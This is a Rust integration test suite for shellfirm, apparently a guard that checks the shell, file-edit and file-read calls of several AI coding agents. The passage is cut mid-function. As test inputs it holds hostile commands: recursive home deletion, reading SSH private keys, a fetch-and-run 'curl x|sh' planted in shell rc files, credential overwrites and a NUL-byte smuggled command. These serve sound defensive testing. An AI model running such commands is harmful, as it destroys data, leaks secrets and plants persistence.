//! `shellfirm check --hook <agent>` and `shellfirm connect <agent>` run as a
//! process, the way each agent runs them, with payloads in each agent's
//! documented hook format. Every run uses a temporary HOME and
//! configuration directory.
//!
//! Payload shapes (field names, tool names):
//! - Codex CLI: `codex-rs/hooks/schema/generated/pre-tool-use.command.input.schema.json`
//! - Gemini CLI: `docs/hooks/reference.md` (`BeforeTool`)
//! - Qwen Code: `docs/users/features/hooks.md` (`PreToolUse`)
//! - GitHub Copilot CLI: "GitHub Copilot hooks reference" (`preToolUse`,
//!   camelCase input)
//! - Cline: `sdk/packages/core/src/hooks/hook-file-hooks.ts` (CLI) and
//!   `apps/vscode/src/sdk/hooks-adapter.ts` (VS Code extension)
//! - Windsurf: "Cascade Hooks" (`pre_run_command`, `pre_write_code`,
//!   `pre_read_code`)
//! - OpenCode: the payload sent by the plugin `shellfirm connect opencode`
//!   writes
// The fixture home is set through `HOME`, which Windows does not use for the
// home directory, so these runs are Unix only.
#![cfg(unix)]

use std::io::Write as _;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

use serde_json::{json, Value};

const BIN: &str = env!("CARGO_BIN_EXE_shellfirm");

struct Sandbox {
    _tree: tree_fs::Tree,
    home: PathBuf,
    config: PathBuf,
    work: PathBuf,
}

fn sandbox() -> Sandbox {
    let tree = tree_fs::TreeBuilder::default()
        .add("config/settings.yaml", "audit_enabled: true\n")
        .add("work/README.md", "hi\n")
        .add("home/.keep", "")
        .create()
        .unwrap();
    Sandbox {
        home: tree.root.join("home"),
        config: tree.root.join("config"),
        work: tree.root.join("work"),
        _tree: tree,
    }
}

fn base_command(sb: &Sandbox) -> Command {
    let mut c = Command::new(BIN);
    c.env("HOME", &sb.home)
        .env("SHELLFIRM_NO_CONTEXT", "1")
        .env_remove("SHELLFIRM_CONFIG_DIR")
        .env_remove("XDG_CONFIG_HOME")
        .env_remove("CODEX_HOME")
        .env_remove("COPILOT_HOME")
        .env_remove("CLAUDE_CONFIG_DIR")
        .current_dir(&sb.work);
    c
}

struct Out {
    code: i32,
    stdout: String,
    stderr: String,
}

impl Out {
    fn json(&self) -> Value {
        serde_json::from_str(self.stdout.trim())
            .unwrap_or_else(|e| panic!("stdout is not JSON ({e}): {:?}", self.stdout))
    }
}

fn hook(sb: &Sandbox, agent: &str, payload: &str) -> Out {
    hook_with_env(sb, agent, payload, &[])
}

fn hook_with_env(sb: &Sandbox, agent: &str, payload: &str, env: &[(&str, &Path)]) -> Out {
    let mut cmd = base_command(sb);
    for (k, v) in env {
        cmd.env(k, v);
    }
    let mut child = cmd
        .args(["check", "--hook", agent, "--config-dir"])
        .arg(&sb.config)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .unwrap();
    child
        .stdin
        .take()
        .unwrap()
        .write_all(payload.as_bytes())
        .unwrap();
    let o = child.wait_with_output().unwrap();
    Out {
        code: o.status.code().unwrap_or(-1),
        stdout: String::from_utf8_lossy(&o.stdout).into_owned(),
        stderr: String::from_utf8_lossy(&o.stderr).into_owned(),
    }
}

fn connect(sb: &Sandbox, args: &[&str]) -> Out {
    let o = base_command(sb).arg("connect").args(args).output().unwrap();
    Out {
        code: o.status.code().unwrap_or(-1),
        stdout: String::from_utf8_lossy(&o.stdout).into_owned(),
        stderr: String::from_utf8_lossy(&o.stderr).into_owned(),
    }
}

/// A shell-command payload for `agent` running `cmd` in `cwd`.
fn shell_payload(agent: &str, cmd: &str, cwd: &Path) -> String {
    let cwd = cwd.display().to_string();
    match agent {
        // Every field the Codex input schema requires.
        "codex" => json!({
            "session_id": "019a0000-0000-7000-8000-000000000001",
            "turn_id": "turn-1",
            "transcript_path": null,
            "cwd": cwd,
            "hook_event_name": "PreToolUse",
            "model": "gpt-5-codex",
            "permission_mode": "default",
            "tool_name": "Bash",
            "tool_input": {"command": cmd},
            "tool_use_id": "call_1",
        }),
        // As Gemini CLI 0.69.0 sends it.
        "gemini" => json!({
            "session_id": "becf25fa-117a-4d75-a733-1318347d37b5",
            "transcript_path": "/tmp/chats/session-2026-11-19T19-59-becf25fa.jsonl",
            "cwd": cwd,
            "hook_event_name": "BeforeTool",
            "timestamp": "2026-11-19T10:00:00.000Z",
            "tool_name": "run_shell_command",
            "tool_input": {"command": cmd, "description": "run it"},
        }),
        "qwen" => json!({
            "session_id": "s-1",
            "transcript_path": "/tmp/t.jsonl",
            "cwd": cwd,
            "hook_event_name": "PreToolUse",
            "timestamp": "2026-11-19T10:00:00.000Z",
            "permission_mode": "default",
            "tool_name": "run_shell_command",
            "tool_input": {"command": cmd, "is_background": false},
            "tool_use_id": "toolu_1",
        }),
        // camelCase `preToolUse`, as Copilot CLI 1.0.114 sends it.
        "copilot" => json!({
            "sessionId": "ffab9b3a-8b19-433e-a9a7-8c4d66159a68",
            "timestamp": 1_795_118_582_275_u64,
            "cwd": cwd,
            "toolCallId": "call_1",
            "toolName": "bash",
            "toolArgs": {"command": cmd, "description": "run it"},
        }),
        // VS Code extension shape (parameters JSON-stringified).
        "cline" => json!({
            "clineVersion": "3.40.0",
            "hookName": "PreToolUse",
            "timestamp": "2026-11-19T10:00:00.000Z",
            "taskId": "task-1",
            "workspaceRoots": [cwd],
            "userId": "u",
            "preToolUse": {
                "toolName": "execute_command",
                "parameters": {"command": cmd, "requires_approval": "false"},
            },
        }),
        "windsurf" => json!({
            "agent_action_name": "pre_run_command",
            "trajectory_id": "traj-1",
            "execution_id": "exec-1",
            "timestamp": "2026-11-19T10:00:00.000Z",
            "tool_info": {"command_line": cmd, "cwd": cwd},
        }),
        "opencode" => json!({
            "tool_name": "bash",
            "tool_input": {"command": cmd, "description": "run it"},
            "session_id": "ses_1",
            "tool_use_id": "call_1",
            "cwd": cwd,
        }),
        other => panic!("unknown agent {other}"),
    }
    .to_string()
}

/// The decision an agent's answer encodes: `allow` (nothing said or an
/// explicit allow), `ask` or `deny`, plus the reason text.
fn decision(agent: &str, out: &Out) -> (&'static str, String) {
    if agent == "windsurf" {
        return match out.code {
            0 => ("allow", String::new()),
            2 => ("deny", out.stderr.clone()),
            c => panic!("windsurf hook exit {c}: {}", out.stderr),
        };
    }
    assert_eq!(out.code, 0, "{agent}: {}", out.stderr);
    if out.stdout.trim().is_empty() {
        return ("allow", String::new());
    }
    let v = out.json();
    let pick = |d: &str| match d {
        "allow" => "allow",
        "ask" => "ask",
        "deny" | "block" => "deny",
        other => panic!("{agent}: unexpected decision {other}"),
    };
    match agent {
        "codex" | "qwen" => {
            if let Some(h) = v.get("hookSpecificOutput") {
                let r = h["permissionDecisionReason"].as_str().unwrap().to_string();
                (pick(h["permissionDecision"].as_str().unwrap()), r)
            } else {
                // Codex: a note only (the call goes ahead).
                (
                    "allow",
                    v["systemMessage"].as_str().unwrap_or("").to_string(),
                )
            }
        }
        "gemini" => (
            pick(v["decision"].as_str().unwrap()),
            v["reason"].as_str().unwrap_or("").to_string(),
        ),
        "copilot" => (
            pick(v["permissionDecision"].as_str().unwrap()),
            v["permissionDecisionReason"]
                .as_str()
                .unwrap_or("")
                .to_string(),
        ),
        "cline" => {
            if v["cancel"] == true {
                ("deny", v["errorMessage"].as_str().unwrap().to_string())
            } else {
                ("allow", String::new())
            }
        }
        "opencode" => (
            pick(v["decision"].as_str().unwrap()),
            v["reason"].as_str().unwrap_or("").to_string(),
        ),
        other => panic!("unknown agent {other}"),
    }
}

const AGENTS: &[&str] = &[
    "codex", "gemini", "qwen", "copilot", "cline", "windsurf", "opencode",
];

/// Agents that can stop and ask a human.
const CAN_ASK: &[&str] = &["gemini", "qwen", "copilot"];

#[test]
fn shell_commands_get_each_agents_decision() {
    let sb = sandbox();
    for agent in AGENTS {
        for (cmd, want, rule) in [
            ("rm -rf ~/", "deny", "fs:recursively_delete"),
            ("git push -f origin main", "deny", "git:force_push"),
            ("cat ~/.ssh/id_rsa", "ask", "exfil:read_secret_file"),
            ("ls -la", "allow", ""),
            ("npm test", "allow", ""),
        ] {
            let out = hook(&sb, agent, &shell_payload(agent, cmd, &sb.work));
            let (got, reason) = decision(agent, &out);
            let want = if want == "ask" && !CAN_ASK.contains(agent) {
                "deny"
            } else {
                want
            };
            assert_eq!(got, want, "{agent} `{cmd}`: {}{}", out.stdout, out.stderr);
            if !rule.is_empty() {
                // The reason names the rule, its severity and a safer way.
                assert!(reason.contains(rule), "{agent} `{cmd}`: {reason}");
                assert!(
                    reason.contains("[HIGH]")
                        || reason.contains("[CRITICAL]")
                        || reason.contains("[MEDIUM]"),
                    "{agent}: {reason}"
                );
                assert!(reason.contains("Safe alternative"), "{agent}: {reason}");
            }
            if want == "deny" && rule == "exfil:read_secret_file" {
                assert!(reason.contains("cannot ask"), "{agent}: {reason}");
            }
        }
    }
    // Every decision is in the audit trail, with the agent's name.
    let log = std::fs::read_to_string(sb.config.join("audit.log")).unwrap();
    for agent in AGENTS {
        assert!(
            log.contains(&format!("\"agent_name\":\"{agent}\"")),
            "{agent} missing from the audit log"
        );
    }
}

#[test]
fn malformed_input_fails_closed_for_every_agent() {
    let sb = sandbox();
    for agent in AGENTS {
        for bad in ["{not json", "", "[1, 2]", "\"text\"", "{}"] {
            let out = hook(&sb, agent, bad);
            let (got, reason) = decision(agent, &out);
            assert_eq!(got, "deny", "{agent} {bad:?}: {}{}", out.stdout, out.stderr);
            assert!(
                reason.contains("Failing closed"),
                "{agent} {bad:?}: {reason}"
            );
        }
    }
}

#[test]
fn tools_shellfirm_has_no_opinion_about_pass() {
    let sb = sandbox();
    for (agent, payload) in [
        (
            "gemini",
            json!({"session_id": "s", "cwd": "/tmp", "hook_event_name": "BeforeTool",
                   "tool_name": "list_directory", "tool_input": {"dir_path": "."}}),
        ),
        (
            "qwen",
            json!({"session_id": "s", "cwd": "/tmp", "hook_event_name": "PreToolUse",
                   "tool_name": "glob", "tool_input": {"pattern": "**/*.rs"}}),
        ),
        (
            "copilot",
            json!({"sessionId": "s", "timestamp": 1, "cwd": "/tmp", "toolName": "grep",
                   "toolArgs": "{\"pattern\":\"rm -rf\"}"}),
        ),
        (
            "cline",
            json!({"taskId": "t", "workspaceRoots": ["/tmp"],
                   "tool_call": {"id": "c", "name": "search_codebase", "input": {"queries": ["rm -rf /"]}}}),
        ),
        (
            "windsurf",
            json!({"agent_action_name": "pre_mcp_tool_use", "trajectory_id": "t",
                   "tool_info": {"mcp_server_name": "x", "mcp_tool_name": "y", "mcp_tool_arguments": {}}}),
        ),
        // OpenCode's task tool has a `command` argument (a slash command).
        (
            "opencode",
            json!({"tool_name": "task", "tool_input": {"command": "rm -rf /", "prompt": "x"},
                   "session_id": "s", "tool_use_id": "c", "cwd": "/tmp"}),
        ),
    ] {
        let out = hook(&sb, agent, &payload.to_string());
        assert_eq!(decision(agent, &out).0, "allow", "{agent}: {}", out.stdout);
    }
}

#[test]
fn file_edits_and_reads_are_checked() {
    let sb = sandbox();
    let zshrc = sb.home.join(".zshrc").display().to_string();
    // The secret-file check knows home directories by their usual prefixes
    // (`/home/<user>`, `/Users/<user>`), not by $HOME.
    let key = "/home/dev/.ssh/id_ed25519".to_string();
    let readme = sb.work.join("README.md").display().to_string();
    let cwd = sb.work.display().to_string();
    let cases: Vec<(&str, Value, &str)> = vec![
        (
            "codex",
            json!({"cwd": cwd, "hook_event_name": "PreToolUse", "tool_name": "apply_patch",
                   "tool_use_id": "c", "session_id": "s", "turn_id": "t",
                   "tool_input": {"command": format!(
                       "*** Begin Patch\n*** Update File: README.md\n@@\n-hi\n+ho\n*** Update File: {zshrc}\n@@\n+alias x=y\n*** End Patch\n")}}),
            "shellfirm-self:rc_file_edit",
        ),
        (
            "gemini",
            json!({"session_id": "s", "cwd": cwd, "hook_event_name": "BeforeTool",
                   "tool_name": "write_file", "tool_input": {"file_path": zshrc, "content": "x"}}),
            "shellfirm-self:rc_file_edit",
        ),
        (
            "gemini",
            json!({"session_id": "s", "cwd": cwd, "hook_event_name": "BeforeTool",
                   "tool_name": "read_file", "tool_input": {"file_path": key}}),
            "exfil:read_secret_file",
        ),
        (
            "qwen",
            json!({"session_id": "s", "cwd": cwd, "hook_event_name": "PreToolUse",
                   "tool_name": "edit", "tool_input": {"file_path": zshrc, "old_string": "a", "new_string": "b"}}),
            "shellfirm-self:rc_file_edit",
        ),
        (
            "copilot",
            json!({"sessionId": "s", "timestamp": 1, "cwd": cwd, "toolName": "create",
                   "toolArgs": {"path": zshrc, "file_text": "x"}}),
            "shellfirm-self:rc_file_edit",
        ),
        (
            "copilot",
            json!({"sessionId": "s", "timestamp": 1, "cwd": cwd, "toolName": "view",
                   "toolArgs": json!({"path": key}).to_string()}),
            "exfil:read_secret_file",
        ),
        // Cline CLI / SDK shape.
        (
            "cline",
            json!({"taskId": "t", "workspaceRoots": [cwd],
                   "tool_call": {"id": "c", "name": "editor", "input": {"path": zshrc, "new_text": "x"}}}),
            "shellfirm-self:rc_file_edit",
        ),
        (
            "cline",
            json!({"taskId": "t", "workspaceRoots": [cwd],
                   "tool_call": {"id": "c", "name": "read_files",
                                 "input": {"files": [{"path": readme}, {"path": key}]}}}),
            "exfil:read_secret_file",
        ),
        (
            "windsurf",
            json!({"agent_action_name": "pre_write_code", "trajectory_id": "t", "execution_id": "e",
                   "tool_info": {"file_path": zshrc, "edits": [{"old_string": "", "new_string": "x"}]}}),
            "shellfirm-self:rc_file_edit",
        ),
        (
            "windsurf",
            json!({"agent_action_name": "pre_read_code", "trajectory_id": "t",
                   "tool_info": {"file_path": key}}),
            "exfil:read_secret_file",
        ),
        (
            "opencode",
            json!({"tool_name": "write", "tool_input": {"filePath": zshrc, "content": "x"},
                   "session_id": "s", "tool_use_id": "c", "cwd": cwd}),
            "shellfirm-self:rc_file_edit",
        ),
        (
            "opencode",
            json!({"tool_name": "apply_patch", "tool_input": {"patchText": format!(
                       "*** Begin Patch\n*** Add File: {zshrc}\n+x\n*** End Patch")},
                   "session_id": "s", "tool_use_id": "c", "cwd": cwd}),
            "shellfirm-self:rc_file_edit",
        ),
    ];
    for (agent, payload, rule) in cases {
        let out = hook(&sb, agent, &payload.to_string());
        let (got, reason) = decision(agent, &out);
        let want = if CAN_ASK.contains(&agent) {
            "ask"
        } else {
            "deny"
        };
        assert_eq!(got, want, "{agent} {payload}: {}{}", out.stdout, out.stderr);
        assert!(reason.contains(rule), "{agent}: {reason}");
    }
    // An ordinary file edit is no business of shellfirm's.
    for (agent, payload) in [
        (
            "codex",
            json!({"cwd": cwd, "tool_name": "apply_patch", "tool_use_id": "c", "session_id": "s",
                   "tool_input": {"command": "*** Begin Patch\n*** Update File: README.md\n@@\n-hi\n+ho\n*** End Patch"}}),
        ),
        (
            "copilot",
            json!({"sessionId": "s", "timestamp": 1, "cwd": cwd, "toolName": "edit",
                   "toolArgs": {"path": readme, "old_str": "hi", "new_str": "ho"}}),
        ),
    ] {
        let out = hook(&sb, agent, &payload.to_string());
        assert_eq!(decision(agent, &out).0, "allow", "{agent}: {}", out.stdout);
    }
    // Agent-instruction edits stay an everyday task where the agent cannot
    // ask: Codex lets them through with a note.
    let out = hook(
        &sb,
        "codex",
        &json!({"cwd": cwd, "tool_name": "apply_patch", "tool_use_id": "c", "session_id": "s",
                "tool_input": {"command": "*** Begin Patch\n*** Add File: AGENTS.md\n+be nice\n*** End Patch"}})
        .to_string(),
    );
    let v = out.json();
    assert!(v.get("hookSpecificOutput").is_none(), "{v}");
    assert!(
        v["systemMessage"]
            .as_str()
            .unwrap()
            .contains("shellfirm-self:agent_instructions_edit"),
        "{v}"
    );
}

#[test]
fn malformed_tool_input_of_a_known_tool_fails_closed() {
    let sb = sandbox();
    for (agent, payload) in [
        (
            "codex",
            json!({"tool_name": "Bash", "tool_input": {"command": 5}}),
        ),
        (
            "codex",
            json!({"tool_name": "apply_patch", "tool_input": {"command": "no headers"}}),
        ),
        (
            "gemini",
            json!({"tool_name": "run_shell_command", "tool_input": {}}),
        ),
        (
            "qwen",
            json!({"tool_name": "write_file", "tool_input": {"content": "x"}}),
        ),
        (
            "copilot",
            json!({"sessionId": "s", "toolName": "bash", "toolArgs": "{broken"}),
        ),
        ("copilot", json!({"sessionId": "s", "cwd": "/tmp"})),
        (
            "cline",
            json!({"taskId": "t", "preToolUse": {"toolName": "execute_command", "parameters": {}}}),
        ),
        ("cline", json!({"taskId": "t"})),
        (
            "windsurf",
            json!({"agent_action_name": "pre_run_command", "tool_info": {}}),
        ),
        ("opencode", json!({"tool_name": "bash", "tool_input": {}})),
    ] {
        let out = hook(&sb, agent, &payload.to_string());
        let (got, reason) = decision(agent, &out);
        assert_eq!(got, "deny", "{agent} {payload}: {}", out.stdout);
        assert!(reason.contains("Failing closed"), "{agent}: {reason}");
    }
}

#[test]
fn connect_installs_and_removes_every_agent() {
    let sb = sandbox();
    let files = [
        ("codex", ".codex/hooks.json"),
        ("gemini", ".gemini/settings.json"),
        ("qwen", ".qwen/settings.json"),
        ("copilot", ".copilot/hooks/shellfirm.json"),
        ("windsurf", ".codeium/windsurf/hooks.json"),
        ("opencode", ".config/opencode/plugins/shellfirm.js"),
    ];
    for (agent, file) in files {
        let dry = connect(&sb, &[agent, "--dry-run"]);
        assert_eq!(dry.code, 0, "{agent}: {}{}", dry.stdout, dry.stderr);
        assert!(
            dry.stdout.contains("Would create"),
            "{agent}: {}",
            dry.stdout
        );
        assert!(
            !sb.home.join(file).exists(),
            "{agent}: dry run wrote {file}"
        );

        let out = connect(&sb, &[agent]);
        assert_eq!(out.code, 0, "{agent}: {}{}", out.stdout, out.stderr);
        let content = std::fs::read_to_string(sb.home.join(file)).unwrap();
        assert!(
            content.contains(&format!("check --hook {agent}")) || content.contains("\"opencode\""),
            "{agent}: {content}"
        );
        let again = connect(&sb, &[agent]);
        assert!(
            again.stdout.contains("already connected"),
            "{agent}: {}",
            again.stdout
        );

        let off = connect(&sb, &[agent, "--uninstall"]);
        assert_eq!(off.code, 0, "{agent}: {}{}", off.stdout, off.stderr);
        assert!(!sb.home.join(file).exists(), "{agent}: {file} left behind");
    }
    // `connect --hooks-only` keeps working for the tools with an MCP server too.
    if cfg!(unix) {
        let out = connect(&sb, &["cline", "--hooks-only"]);
        assert_eq!(out.code, 0, "{}{}", out.stdout, out.stderr);
        let script = sb.home.join("Documents/Cline/Hooks/PreToolUse");
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            let mode = std::fs::metadata(&script).unwrap().permissions().mode();
            assert_eq!(mode & 0o111, 0o111, "the Cline hook must be executable");
        }
        let off = connect(&sb, &["cline", "--uninstall", "--hooks-only"]);
        assert_eq!(off.code, 0);
        assert!(!script.exists());
    }
    // No MCP registration for these: --mcp-only is an error, not a no-op.
    let out = connect(&sb, &["codex", "--mcp-only"]);
    assert_ne!(out.code, 0);
}

/// The Cline hook script answers for shellfirm: the payload goes through
/// unchanged, and when shellfirm cannot run the tool call is cancelled.
#[cfg(unix)]
#[test]
fn cline_script_relays_and_fails_closed() {
    let sb = sandbox();
    let out = connect(&sb, &["cline", "--hooks-only"]);
    assert_eq!(out.code, 0, "{}{}", out.stdout, out.stderr);
    let script = sb.home.join("Documents/Cline/Hooks/PreToolUse");
    let run = |path: &str, payload: &str| -> Value {
        let mut child = Command::new(&script)
            .env("HOME", &sb.home)
            .env("PATH", path)
            .env("SHELLFIRM_NO_CONTEXT", "1")
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::null())
            .spawn()
            .unwrap();
        // The script may answer and exit before reading its input (when
        // shellfirm cannot run), so a broken pipe here is not a failure.
        let _ = child.stdin.take().unwrap().write_all(payload.as_bytes());
        let o = child.wait_with_output().unwrap();
        assert!(o.status.success());
        serde_json::from_slice(&o.stdout).unwrap()
    };
    let bin_dir = Path::new(BIN).parent().unwrap().display().to_string();
    let path = format!("{bin_dir}:/usr/bin:/bin");
    let deny = run(&path, &shell_payload("cline", "rm -rf ~/", &sb.work));
    assert_eq!(deny["cancel"], true, "{deny}");
    assert!(deny["errorMessage"]
        .as_str()
        .unwrap()
        .contains("fs:recursively_delete"));
    let allow = run(&path, &shell_payload("cline", "ls -la", &sb.work));
    assert_eq!(allow["cancel"], false, "{allow}");
    // shellfirm not on PATH: the recorded binary is used ...
    let fallback = run("/usr/bin:/bin", &shell_payload("cline", "ls", &sb.work));
    assert_eq!(fallback["cancel"], false, "{fallback}");
    // ... and when no shellfirm runs at all, the call is cancelled.
    let text = std::fs::read_to_string(&script)
        .unwrap()
        .replace(BIN, "/nonexistent/shellfirm");
    std::fs::write(&script, text).unwrap();
    let missing = run("/usr/bin:/bin", &shell_payload("cline", "ls", &sb.work));
    assert_eq!(missing["cancel"], true, "{missing}");
    assert!(missing["errorMessage"]
        .as_str()
        .unwrap()
        .contains("could not check"));
}

/// A patch payload for `agent`'s own patch tool.
fn patch_payload(agent: &str, patch: &str, cwd: &Path) -> Value {
    let cwd = cwd.display().to_string();
    match agent {
        "codex" => json!({"cwd": cwd, "hook_event_name": "PreToolUse", "tool_name": "apply_patch",
                          "tool_use_id": "c", "session_id": "s", "tool_input": {"command": patch}}),
        "copilot" => {
            json!({"sessionId": "s", "timestamp": 1, "cwd": cwd, "toolName": "apply_patch",
                            "toolArgs": {"input": patch}})
        }
        "cline" => json!({"taskId": "t", "workspaceRoots": [cwd],
                          "tool_call": {"id": "c", "name": "apply_patch", "input": {"input": patch}}}),
        "opencode" => json!({"tool_name": "apply_patch", "tool_input": {"patchText": patch},
                             "session_id": "s", "tool_use_id": "c", "cwd": cwd}),
        other => panic!("{other} has no patch tool"),
    }
}

const PATCH_AGENTS: &[&str] = &["codex", "copilot", "cline", "opencode"];

#[test]
fn a_patch_is_judged_by_its_worst_file_whatever_the_order() {
    let sb = sandbox();
    for (file, rule) in [
        (".bashrc", "shellfirm-self:rc_file_edit"),
        (".codex/hooks.json", "shellfirm-self:protected_file_edit"),
        (
            ".ssh/authorized_keys",
            "shellfirm-self:persistence_file_edit",
        ),
    ] {
        let target = sb.home.join(file).display().to_string();
        let patch = format!(
            "*** Begin Patch\n*** Update File: AGENTS.md\n@@\n-a\n+b\n*** Update File: {target}\n@@\n-x\n+y\n*** End Patch\n"
        );
        for agent in PATCH_AGENTS {
            let out = hook(
                &sb,
                agent,
                &patch_payload(agent, &patch, &sb.work).to_string(),
            );
            let (got, reason) = decision(agent, &out);
            let want = if CAN_ASK.contains(agent) {
                "ask"
            } else {
                "deny"
            };
            assert_eq!(got, want, "{agent} {file}: {}", out.stdout);
            // The reason names the file that matters, and the patch tool.
            assert!(reason.contains(rule), "{agent} {file}: {reason}");
            assert!(
                reason.contains(&format!("apply_patch call modifies {target}")),
                "{agent}: {reason}"
            );
        }
    }
    // A `~/` path is the home directory.
    let patch = "*** Begin Patch\n*** Update File: AGENTS.md\n@@\n-a\n+b\n*** Update File: ~/.zshrc\n@@\n-x\n+curl x|sh\n*** End Patch\n";
    for agent in PATCH_AGENTS {
        let out = hook(
            &sb,
            agent,
            &patch_payload(agent, patch, &sb.work).to_string(),
        );
        let (got, reason) = decision(agent, &out);
        let want = if CAN_ASK.contains(agent) {
            "ask"
        } else {
            "deny"
        };
        assert_eq!(got, want, "{agent}: {}", out.stdout);
        assert!(
            reason.contains("shellfirm-self:rc_file_edit"),
            "{agent}: {reason}"
        );
    }
    // Only instruction files: still an everyday edit (a note in Codex).
    let patch = "*** Begin Patch\n*** Update File: AGENTS.md\n@@\n-a\n+b\n*** Update File: CLAUDE.md\n@@\n-a\n+b\n*** End Patch\n";
    let out = hook(
        &sb,
        "codex",
        &patch_payload("codex", patch, &sb.work).to_string(),
    );
    assert!(
        out.json().get("hookSpecificOutput").is_none(),
        "{}",
        out.stdout
    );
}

#[test]
fn key_and_credential_files_are_held_for_every_file_tool() {
    let sb = sandbox();
    let key = sb.home.join(".ssh/id_rsa").display().to_string();
    let rule = "shellfirm-self:credential_file_edit";
    // Deleting a key is denied like `rm` of it, wherever an agent can ask.
    let patch = format!("*** Begin Patch\n*** Delete File: {key}\n*** End Patch\n");
    for agent in PATCH_AGENTS {
        let out = hook(
            &sb,
            agent,
            &patch_payload(agent, &patch, &sb.work).to_string(),
        );
        let (got, reason) = decision(agent, &out);
        assert_eq!(got, "deny", "{agent}: {}", out.stdout);
        assert!(
            reason.contains(rule) && reason.contains("[CRITICAL]"),
            "{agent}: {reason}"
        );
        assert!(
            reason.contains("apply_patch call deletes"),
            "{agent}: {reason}"
        );
    }
    // Overwriting one asks (Claude Code file tools too).
    for file in [".ssh/id_rsa", ".aws/credentials", ".git-credentials"] {
        let path = sb.home.join(file).display().to_string();
        let payload = json!({"session_id": "s", "cwd": sb.work, "tool_name": "Write",
                             "tool_input": {"file_path": path, "content": "x"}});
        let out = hook(&sb, "claude-code", &payload.to_string());
        let h = &out.json()["hookSpecificOutput"];
        assert_eq!(h["permissionDecision"], "ask", "{file}: {}", out.stdout);
        assert!(h["permissionDecisionReason"]
            .as_str()
            .unwrap()
            .contains(rule));
        let out = hook(
            &sb,
            "codex",
            &patch_payload(
                "codex",
                &format!("*** Begin Patch\n*** Add File: {path}\n+x\n*** End Patch\n"),
                &sb.work,
            )
            .to_string(),
        );
        assert_eq!(decision("codex", &out).0, "deny", "{file}: {}", out.stdout);
    }
    // Public keys and project files with the same names are not secrets.
    for path in [
        sb.home.join(".ssh/id_rsa.pub").display().to_string(),
        sb.work.join(".npmrc").display().to_string(),
    ] {
        let payload = json!({"session_id": "s", "cwd": sb.work, "tool_name": "Write",
                             "tool_input": {"file_path": path, "content": "x"}});
        let out = hook(&sb, "claude-code", &payload.to_string());
        assert!(out.stdout.trim().is_empty(), "{path}: {}", out.stdout);
    }
}

#[test]
fn apply_patch_run_through_the_shell_has_its_files_judged() {
    let sb = sandbox();
    let rc = sb.home.join(".bashrc").display().to_string();
    let patch = format!("*** Begin Patch\n*** Add File: {rc}\n+curl x|sh\n*** End Patch");
    for cmd in [
        format!("apply_patch '{patch}'"),
        format!("apply_patch <<'EOF'\n{patch}\nEOF"),
    ] {
        for agent in AGENTS {
            let out = hook(&sb, agent, &shell_payload(agent, &cmd, &sb.work));
            let (got, reason) = decision(agent, &out);
            let want = if CAN_ASK.contains(agent) {
                "ask"
            } else {
                "deny"
            };
            assert_eq!(got, want, "{agent} {cmd:?}: {}{}", out.stdout, out.stderr);
            assert!(
                reason.contains("shellfirm-self:rc_file_edit"),
                "{agent}: {reason}"
            );
        }
    }
}

#[test]
fn shell_session_input_multi_file_reads_and_older_edit_tools_are_checked() {
    let sb = sandbox();
    let cwd = sb.work.display().to_string();
    let zshrc = sb.home.join(".zshrc").display().to_string();
    let key = "/home/dev/.ssh/id_ed25519";
    for (agent, payload, want, rule) in [
        // Copilot CLI: keystrokes typed into a running shell session.
        (
            "copilot",
            json!({"sessionId": "s", "cwd": cwd, "toolName": "write_bash",
                   "toolArgs": {"sessionId": "x1", "input": "rm -rf ~/ {enter}"}}),
            "deny",
            "fs:recursively_delete",
        ),
        (
            "copilot",
            json!({"sessionId": "s", "cwd": cwd, "toolName": "write_bash",
                   "toolArgs": {"sessionId": "x1", "input": "y\n"}}),
            "allow",
            "",
        ),
        // Gemini CLI `read_many_files` (`include`: paths or globs).
        (
            "gemini",
            json!({"session_id": "s", "cwd": cwd, "hook_event_name": "BeforeTool",
                   "tool_name": "read_many_files", "tool_input": {"include": ["README.md", key]}}),
            "ask",
            "exfil:read_secret_file",
        ),
        (
            "gemini",
            json!({"session_id": "s", "cwd": cwd, "hook_event_name": "BeforeTool",
                   "tool_name": "read_many_files", "tool_input": {"include": ["src/**/*.rs"]}}),
            "allow",
            "",
        ),
        // OpenCode's older `multiedit` and `patch` tools.
        (
            "opencode",
            json!({"tool_name": "multiedit", "tool_input": {"filePath": zshrc, "edits": []},
                   "session_id": "s", "tool_use_id": "c", "cwd": cwd}),
            "deny",
            "shellfirm-self:rc_file_edit",
        ),
        (
            "opencode",
            json!({"tool_name": "patch", "tool_input": {"patchText": format!(
                       "*** Begin Patch\n*** Add File: {zshrc}\n+x\n*** End Patch")},
                   "session_id": "s", "tool_use_id": "c", "cwd": cwd}),
            "deny",
            "shellfirm-self:rc_file_edit",
        ),
        (
            "opencode",
            json!({"tool_name": "multiedit", "tool_input": {"filePath": "src/app.ts", "edits": []},
                   "session_id": "s", "tool_use_id": "c", "cwd": cwd}),
            "allow",
            "",
        ),
    ] {
        let out = hook(&sb, agent, &payload.to_string());
        let (got, reason) = decision(agent, &out);
        assert_eq!(got, want, "{agent} {payload}: {}{}", out.stdout, out.stderr);
        assert!(reason.contains(rule), "{agent}: {reason}");
    }
    // The OpenCode plugin forwards those tools and shows review notes.
    let out = connect(&sb, &["opencode"]);
    assert_eq!(out.code, 0, "{}{}", out.stdout, out.stderr);
    let plugin =
        std::fs::read_to_string(sb.home.join(".config/opencode/plugins/shellfirm.js")).unwrap();
    for tool in ["\"multiedit\"", "\"patch\""] {
        assert!(plugin.contains(tool), "{tool} not forwarded");
    }
    assert!(plugin.contains("answer.warning") && plugin.contains("showToast"));
}

#[test]
fn a_nul_byte_in_a_tool_call_fails_closed_for_every_agent() {
    let sb = sandbox();
    for agent in AGENTS.iter().chain(&["claude-code"]) {
        let payload = if *agent == "claude-code" {
            json!({"session_id": "s", "cwd": sb.work, "tool_name": "Bash",
                   "tool_input": {"command": "rm -rf ~/Documents\u{0}; ls"}})
            .to_string()
        } else {
            shell_payload(agent, "rm -rf ~/Documents\u{0}; ls", &sb.work)
        };
        let out = hook(&sb, agent, &payload);
        let (got, reason) = if *agent == "claude-code" {
            let h = out.json()["hookSpecificOutput"].clone();
            (
                if h["permissionDecision"] == "deny" {
                    "deny"
                } else {
                    "other"
                },
                h["permissionDecisionReason"]
                    .as_str()
                    .unwrap_or("")
                    .to_string(),
            )
        } else {
